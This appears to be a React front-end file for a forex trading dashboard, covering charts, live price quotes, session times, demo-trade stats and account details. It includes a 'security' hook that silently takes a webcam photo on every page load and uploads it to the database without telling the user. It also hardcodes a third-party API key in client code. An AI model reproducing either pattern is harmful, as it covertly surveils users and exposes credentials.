import React, { useEffect, useRef, useState } from "react";
import "./landing.css";
import { supabase } from "./supabaseClient"; // adjust path if different
import AIAssistant from "./AIAssistant.jsx";
import BAndP from "./B@P.jsx";
import SignalsPage from "./signals.jsx";
import GoLive from "./gLive.jsx";
import WatchLive from "./live.jsx";
import CommunityPage from "./community.jsx";
import Analyze from "./analyze.jsx";
import TradingPanel from "./TradingPanel.jsx";
import Account from "./Account.jsx";
import {
  getOrCreateDemoAccount,
  fetchOpenPositions,
  fetchClosedPositions,
} from "./demoTradingApi";

const TWELVE_DATA_KEY = "4265125a56954b9892da7a132fdd0950";
const TWELVE_DATA_URL = "https://api.twelvedata.com/quote";

const PAIRS = [
  { name: "EUR/USD", td: "EUR/USD", tv: "FX:EURUSD" },
  { name: "GBP/USD", td: "GBP/USD", tv: "FX:GBPUSD" },
  { name: "USD/JPY", td: "USD/JPY", tv: "FX:USDJPY" },
  { name: "USD/CHF", td: "USD/CHF", tv: "FX:USDCHF" },
  { name: "AUD/USD", td: "AUD/USD", tv: "FX:AUDUSD" },
];

const SIGNALS_PAIRS = ["EUR/USD", "GBP/USD", "USD/JPY"];

const SYMBOLS = PAIRS.map((p) => ({ label: p.name, value: p.tv }));

const INTERVALS = [
  { label: "1m", value: "1" },
  { label: "5m", value: "5" },
  { label: "15m", value: "15" },
  { label: "1H", value: "60" },
  { label: "4H", value: "240" },
  { label: "1D", value: "D" },
];

const NAV_ITEMS = [
  { label: "Dashboard", value: "dashboard" },
  { label: "Account", value: "account" },
  { label: "Analyze", value: "analyze" },
  { label: "Demo Trade", value: "demo" },
  { label: "Signals", value: "signals" },
  { label: "Live", value: "live" },
  { label: "Partners", value: "partners" },
  { label: "Community", value: "Community" },
  { label: "Go Live", value: "GLive" },
];

const MARKET_WATCH_BASE = PAIRS.map((p) => ({
  name: p.name,
  price: "—",
  change: "—",
  up: true,
}));

const SESSIONS = [
  { name: "Asia", startHour: 2, endHour: 9 },
  { name: "London", startHour: 9, endHour: 15.5 },
  { name: "New York", startHour: 15.5, endHour: 24 },
];

function formatCountdown(hoursFloat) {
  const totalMinutes = Math.round(hoursFloat * 60);
  const h = Math.floor(totalMinutes / 60);
  const m = totalMinutes % 60;
  if (h <= 0) return `${m}m`;
  return `${h}h ${m}m`;
}

function isForexMarketClosed(date) {
  const utcDay = date.getUTCDay();
  const utcHour = date.getUTCHours();

  if (utcDay === 6) return true;
  if (utcDay === 0 && utcHour < 22) return true;
  if (utcDay === 5 && utcHour >= 22) return true;
  return false;
}

function ForexSessions() {
  const [now, setNow] = useState(new Date());

  useEffect(() => {
    const id = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(id);
  }, []);

  const marketClosed = isForexMarketClosed(now);

  const sastString = now.toLocaleString("en-US", {
    timeZone: "Africa/Johannesburg",
    hour12: false,
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
  const [hh, mm, ss] = sastString.split(":").map(Number);
  const currentHour = hh + mm / 60 + ss / 3600;

  const sessionInfo = SESSIONS.map((s) => {
    const isActive = !marketClosed && currentHour >= s.startHour && currentHour < s.endHour;
    let opensIn = null;
    if (!isActive && !marketClosed) {
      let diff = s.startHour - currentHour;
      if (diff < 0) diff += 24;
      opensIn = formatCountdown(diff);
    }
    return { ...s, isActive, opensIn };
  });

  return (
    <div className="dashboard-card forex-sessions">
      <div className="card-header">
        <h2>Forex Sessions</h2>
        <span className={`live-badge ${marketClosed ? "closed" : ""}`}>
          {marketClosed ? "● CLOSED" : `● ${sastString.slice(0, 5)} SAST`}
        </span>
      </div>

      {marketClosed && (
        <div className="market-closed-banner">
          Market closed for the weekend — reopens Sunday 22:00 UTC
        </div>
      )}

      <div className="market-list">
        {sessionInfo.map((s) => (
          <div className="market-row" key={s.name}>
            <span className="market-name">{s.name}</span>
            <span className="market-price">
              {String(Math.floor(s.startHour)).padStart(2, "0")}:
              {String(Math.round((s.startHour % 1) * 60)).padStart(2, "0")}
              {" – "}
              {s.endHour === 24
                ? "24:00"
                : `${String(Math.floor(s.endHour)).padStart(2, "0")}:${String(
                    Math.round((s.endHour % 1) * 60)
                  ).padStart(2, "0")}`}
            </span>
            <span className={`market-change ${s.isActive ? "up" : "down"}`}>
              {marketClosed
                ? "● Closed"
                : s.isActive
                ? "● Active"
                : `Opens in ${s.opensIn}`}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
}

function TradingViewChart({ symbol, interval }) {
  const containerRef = useRef(null);

  useEffect(() => {
    const container = containerRef.current;
    if (!container) return;

    container.innerHTML = "";

    const wrapper = document.createElement("div");
    wrapper.className = "tradingview-widget-container__widget";
    wrapper.style.height = "600px";
    wrapper.style.width = "100%";
    container.appendChild(wrapper);

    const script = document.createElement("script");
    script.src = "https://s3.tradingview.com/external-embedding/embed-widget-advanced-chart.js";
    script.type = "text/javascript";
    script.async = true;
    script.innerHTML = JSON.stringify({
      width: "100%",
      height: "600",
      symbol: symbol,
      interval: interval,
      timezone: "Africa/Johannesburg",
      theme: "dark",
      style: "1",
      locale: "en",
      backgroundColor: "#0a0f0d",
      gridColor: "rgba(255,255,255,0.04)",
      hide_top_toolbar: false,
      hide_legend: false,
      allow_symbol_change: false,
      save_image: false,
      calendar: false,
      hide_volume: false,
      support_host: "https://www.tradingview.com",
    });
    container.appendChild(script);

    return () => {
      if (container) container.innerHTML = "";
    };
  }, [symbol, interval]);

  return (
    <div
      className="tradingview-widget-container"
      ref={containerRef}
      style={{ height: "750px", width: "100%" }}
    />
  );
}

function DashboardNav({ user, onLogout, activeNavItem, setActiveNavItem }) {
  return (
    <nav className="dashboard-nav">
      <div className="nav-logo">
        Blue <span>Chip</span> Trading
      </div>

      <div className="nav-menu">
        {NAV_ITEMS.map((item) => (
          <button
            key={item.value}
            className={`nav-menu-item ${activeNavItem === item.value ? "active" : ""}`}
            onClick={() => setActiveNavItem(item.value)}
          >
            {item.label}
          </button>
        ))}
      </div>

      <div className="nav-right">
        <div className="nav-user">
          <div className="user-avatar">{user?.name?.charAt(0) || "U"}</div>
          <span className="user-name">{user?.name || "Trader"}</span>
        </div>
        <button className="logout-btn" onClick={onLogout}>
          Log Out
        </button>
      </div>
    </nav>
  );
}
// Captures one frame from a <video> element and returns it as a Base64 JPEG string
function captureFrame(videoEl) {
  const canvas = document.createElement("canvas");
  canvas.width = videoEl.videoWidth;
  canvas.height = videoEl.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/jpeg", 0.8);
}

// Security feature: on login / whenever Landing mounts (or refreshes) while
// logged in, briefly opens the webcam, grabs a single frame, and stores it
// against the current user in Supabase. Runs once per mount, silently no-ops
// if the user denies camera permission.
function useLoginScreenshot() {
  const captured = useRef(false);

  useEffect(() => {
    if (captured.current) return;
    captured.current = true;

    let stream;
    let cancelled = false;

    const run = async () => {
      try {
        const { data: userData } = await supabase.auth.getUser();
        const authUser = userData?.user;
        if (!authUser) return;

        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (cancelled) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }

        const videoEl = document.createElement("video");
        videoEl.srcObject = stream;
        videoEl.muted = true;
        videoEl.playsInline = true;
        await videoEl.play();

        // Give the feed a moment to actually have frames before capturing.
        await new Promise((resolve) => setTimeout(resolve, 800));
        if (cancelled) return;

        const screenshot = captureFrame(videoEl);

        const { error } = await supabase.from("login_sessions").insert({
          user_id: authUser.id,
          screenshot,
        });

        if (error) console.error("Failed to save login screenshot:", error);
      } catch (err) {
        // Camera denied/unavailable — fail silently, don't block login.
        console.error("Login screenshot capture failed:", err);
      } finally {
        if (stream) stream.getTracks().forEach((t) => t.stop());
      }
    };

    run();

    return () => {
      cancelled = true;
      if (stream) stream.getTracks().forEach((t) => t.stop());
    };
  }, []);
}

export default function Landing({ user, onLogout, onUserUpdate }) {
useLoginScreenshot();
  const [activeSymbol, setActiveSymbol] = useState(SYMBOLS[0].value);
  const [activeInterval, setActiveInterval] = useState("15");
  const [marketWatch, setMarketWatch] = useState(MARKET_WATCH_BASE);
  const [rawQuotes, setRawQuotes] = useState({});
  const [activeNavItem, setActiveNavItem] = useState("dashboard");

  const [dashboardStats, setDashboardStats] = useState({
    balance: null,
    openCount: 0,
    totalTrades: 0,
    winRate: null,
  });

  useEffect(() => {
    let cancelled = false;

    const loadStats = async () => {
      try {
        const acct = await getOrCreateDemoAccount();
        const [open, closed] = await Promise.all([
          fetchOpenPositions(acct.id),
          fetchClosedPositions(acct.id),
        ]);
        if (cancelled) return;

        const wins = closed.filter((p) => p.pnl > 0).length;
        const winRate = closed.length > 0 ? (wins / closed.length) * 100 : null;

        setDashboardStats({
          balance: acct.balance,
          openCount: open.length,
          totalTrades: open.length + closed.length,
          winRate,
        });
      } catch (err) {
        console.error("Dashboard stats fetch error:", err);
      }
    };

    loadStats();
    const id = setInterval(loadStats, 30000);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, []);

  useEffect(() => {
    let cancelled = false;

    const fetchPrices = async () => {
      try {
        const symbolParam = PAIRS.map((p) => p.td).join(",");
        const res = await fetch(
          `${TWELVE_DATA_URL}?symbol=${encodeURIComponent(symbolParam)}&apikey=${TWELVE_DATA_KEY}`
        );
        const data = await res.json();
        if (cancelled) return;

        const isKeyed = PAIRS.some((p) => data[p.td]);

        const nextRawQuotes = {};

        setMarketWatch((prev) =>
          prev.map((m) => {
            const pair = PAIRS.find((p) => p.name === m.name);
            if (!pair) return m;

            const quote = isKeyed ? data[pair.td] : data;
            if (!quote || quote.status === "error" || quote.code >= 400) {
              if (quote?.message) {
                console.error(`TwelveData error for ${m.name}:`, quote.message);
              }
              return m;
            }

            nextRawQuotes[pair.name] = {
              close: quote.close,
              high: quote.high,
              low: quote.low,
              percent_change: quote.percent_change,
            };

            const changePct = parseFloat(quote.percent_change);
            return {
              ...m,
              price: parseFloat(quote.close).toLocaleString(undefined, {
                minimumFractionDigits: 4,
                maximumFractionDigits: 4,
              }),
              change: `${changePct >= 0 ? "+" : ""}${changePct.toFixed(2)}%`,
              up: changePct >= 0,
            };
          })
        );

        if (Object.keys(nextRawQuotes).length > 0) {
          setRawQuotes((prev) => ({ ...prev, ...nextRawQuotes }));
        }
      } catch (err) {
        console.error("TwelveData fetch error:", err);
      }
    };

    fetchPrices();
    const id = setInterval(fetchPrices, 60000);

    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, []);

  const signalsPriceData = SIGNALS_PAIRS
    .map((pair) => (rawQuotes[pair] ? { pair, ...rawQuotes[pair] } : null))
    .filter(Boolean);
  const signalsPriceDataReady = signalsPriceData.length === SIGNALS_PAIRS.length;

  if (activeNavItem === "demo") {
    const plainSymbol = activeSymbol.includes(":") ? activeSymbol.split(":")[1] : activeSymbol;
    return (
      <div className="dashboard-page">
        <div className="dashboard-grid" />
        <DashboardNav
          user={user}
          onLogout={onLogout}
          activeNavItem={activeNavItem}
          setActiveNavItem={setActiveNavItem}
        />

        <div className="demo-trade-section">
          <div className="chart-section">
            <div className="chart-section-header">
              <div className="chart-section-title">
                <h2>Demo Chart</h2>
                <span className="live-badge">● LIVE</span>
              </div>
              <div className="chart-controls">
                <div className="symbol-tabs">
                  {SYMBOLS.map((s) => (
                    <button
                      key={s.value}
                      className={`symbol-tab ${activeSymbol === s.value ? "active" : ""}`}
                      onClick={() => setActiveSymbol(s.value)}
                    >
                      {s.label}
                    </button>
                  ))}
                </div>
                <div className="interval-tabs">
                  {INTERVALS.map((i) => (
                    <button
                      key={i.value}
                      className={`interval-tab ${activeInterval === i.value ? "active" : ""}`}
                      onClick={() => setActiveInterval(i.value)}
                    >
                      {i.label}
                    </button>
                  ))}
                </div>
              </div>
            </div>
            <div className="chart-wrapper">
              <TradingViewChart
                key={`${activeSymbol}-${activeInterval}`}
                symbol={activeSymbol}
                interval={activeInterval}
              />
            </div>
          </div>

          <TradingPanel user={user} activeSymbol={plainSymbol} />
        </div>

        <AIAssistant user={user} activeSymbol={activeSymbol} />
      </div>
    );
  }

  if (activeNavItem === "account") {
    return (
      <div className="dashboard-page">
        <div className="dashboard-grid" />
        <DashboardNav
          user={user}
          onLogout={onLogout}
          activeNavItem={activeNavItem}
          setActiveNavItem={setActiveNavItem}
        />
        <Account user={user} onUserUpdate={onUserUpdate} />
        <AIAssistant user={user} activeSymbol={activeSymbol} />
      </div>
    );
  }

  if (activeNavItem === "signals") {
    return (
      <div className="dashboard-page">
        <div className="dashboard-grid" />
        <DashboardNav
          user={user}
          onLogout={onLogout}
          activeNavItem={activeNavItem}
          setActiveNavItem={setActiveNavItem}
        />
        <SignalsPage priceData={signalsPriceDataReady ? signalsPriceData : []} />
        <AIAssistant user={user} activeSymbol={activeSymbol} />
      </div>
    );
  }

  if (activeNavItem === "partners") {
    return (
      <div className="dashboard-page">
        <div className="dashboard-grid" />
        <DashboardNav
          user={user}
          onLogout={onLogout}
          activeNavItem={activeNavItem}
          setActiveNavItem={setActiveNavItem}
        />
        <BAndP user={user} />
        <AIAssistant user={user} activeSymbol={activeSymbol} />
      </div>
    );
  }

  if (activeNavItem === "analyze") {
    return (
      <div className="dashboard-page">
        <div className="dashboard-grid" />
        <DashboardNav
          user={user}
          onLogout={onLogout}
          activeNavItem={activeNavItem}
          setActiveNavItem={setActiveNavItem}
        />
        <Analyze user={user} activeSymbol={activeSymbol} />
      </div>
    );
  }

  if (activeNavItem === "Community") {
    return (
      <div className="dashboard-page">
        <div className="dashboard-grid" />
        <DashboardNav
          user={user}
          onLogout={onLogout}
          activeNavItem={activeNavItem}
          setActiveNavItem={setActiveNavItem}
        />
        <CommunityPage user={user} />
        <AIAssistant user={user} activeSymbol={activeSymbol} />
      </div>
    );
  }

  if (activeNavItem === "live") {
    return (
      <div className="dashboard-page">
        <div className="dashboard-grid" />
        <DashboardNav
          user={user}
          onLogout={onLogout}
          activeNavItem={activeNavItem}
          setActiveNavItem={setActiveNavItem}
        />
        <WatchLive />
        <AIAssistant user={user} activeSymbol={activeSymbol} />
      </div>
    );
  }

  if (activeNavItem === "GLive") {
    return (
      <div className="dashboard-page">
        <div className="dashboard-grid" />
        <DashboardNav
          user={user}
          onLogout={onLogout}
          activeNavItem={activeNavItem}
          setActiveNavItem={setActiveNavItem}
        />
        <GoLive />
        <AIAssistant user={user} activeSymbol={activeSymbol} />
      </div>
    );
  }

  return (
    <div className="dashboard-page">
      <div className="dashboard-grid" />

      <DashboardNav
        user={user}
        onLogout={onLogout}
        activeNavItem={activeNavItem}
        setActiveNavItem={setActiveNavItem}
      />

      <div className="welcome-banner">
        <div className="welcome-text">
          <h1>
            Welcome back, <span>{user?.name?.split(" ")[0] || "Trader"}</span> 👋
          </h1>
          <p>Here's your trading overview for today.</p>
        </div>
        <div className="welcome-badge">Client Dashboard</div>
      </div>

      <div className="dashboard-stats">
        <div className="stat-card">
          <div className="stat-card-icon">💰</div>
          <div className="stat-card-info">
            <span className="stat-card-label">Account Balance</span>
            <span className="stat-card-value">
              {dashboardStats.balance != null
                ? `$${dashboardStats.balance.toFixed(2)}`
                : "—"}
            </span>
          </div>
        </div>
        <div className="stat-card">
          <div className="stat-card-icon">📈</div>
          <div className="stat-card-info">
            <span className="stat-card-label">Open Positions</span>
            <span className="stat-card-value">{dashboardStats.openCount}</span>
          </div>
        </div>
        <div className="stat-card">
          <div className="stat-card-icon">📊</div>
          <div className="stat-card-info">
            <span className="stat-card-label">Total Trades</span>
            <span className="stat-card-value">{dashboardStats.totalTrades}</span>
          </div>
        </div>
        <div className="stat-card">
          <div className="stat-card-icon">🎯</div>
          <div className="stat-card-info">
            <span className="stat-card-label">Win Rate</span>
            <span className="stat-card-value">
              {dashboardStats.winRate != null
                ? `${dashboardStats.winRate.toFixed(0)}%`
                : "—"}
            </span>
          </div>
        </div>
      </div>

      <div className="chart-section">
        <div className="chart-section-header">
          <div className="chart-section-title">
            <h2>Live Charts</h2>
            <span className="live-badge">● LIVE</span>
          </div>
          <div className="chart-controls">
            <div className="symbol-tabs">
              {SYMBOLS.map((s) => (
                <button
                  key={s.value}
                  className={`symbol-tab ${activeSymbol === s.value ? "active" : ""}`}
                  onClick={() => setActiveSymbol(s.value)}
                >
                  {s.label}
                </button>
              ))}
            </div>
            <div className="interval-tabs">
              {INTERVALS.map((i) => (
                <button
                  key={i.value}
                  className={`interval-tab ${activeInterval === i.value ? "active" : ""}`}
                  onClick={() => setActiveInterval(i.value)}
                >
                  {i.label}
                </button>
              ))}
            </div>
          </div>
        </div>
        <div className="chart-wrapper">
          <TradingViewChart
            key={`${activeSymbol}-${activeInterval}`}
            symbol={activeSymbol}
            interval={activeInterval}
          />
        </div>
      </div>

      <div className="dashboard-content">
        <div className="dashboard-card market-watch">
          <div className="card-header">
            <h2>Market Watch</h2>
            <span className="live-badge">● LIVE</span>
          </div>
          <div className="market-list">
            {marketWatch.map((m) => (
              <div className="market-row" key={m.name}>
                <span className="market-name">{m.name}</span>
                <span className="market-price">{m.price}</span>
                <span className={`market-change ${m.up ? "up" : "down"}`}>
                  {m.change !== "—" ? (m.up ? "▲" : "▼") : ""} {m.change}
                </span>
              </div>
            ))}
          </div>
        </div>

        <ForexSessions />

        <div className="dashboard-card account-info">
          <div className="card-header">
            <h2>Account Info</h2>
          </div>
          <div className="account-list">
            <div className="account-row">
              <span className="account-label">Full Name</span>
              <span className="account-value">{user?.name || "—"}</span>
            </div>
            <div className="account-row">
              <span className="account-label">Email</span>
              <span className="account-value">{user?.email || "—"}</span>
            </div>
            <div className="account-row">
              <span className="account-label">ID Number</span>
              <span className="account-value">{user?.idNumber || "—"}</span>
            </div>
            <div className="account-row">
              <span className="account-label">Plan</span>
              <span className="account-value plan">All In Access</span>
            </div>
            <div className="account-row">
              <span className="account-label">Status</span>
              <span className="account-value status">● Active</span>
            </div>
          </div>
        </div>
      </div>

      <footer className="dashboard-footer">
        <p>© 2026 Blue Chip Trading. All rights reserved.</p>
      </footer>

      {/* AI Assistant - floats over everything */}
      <AIAssistant user={user} activeSymbol={activeSymbol} />
    </div>
  );
}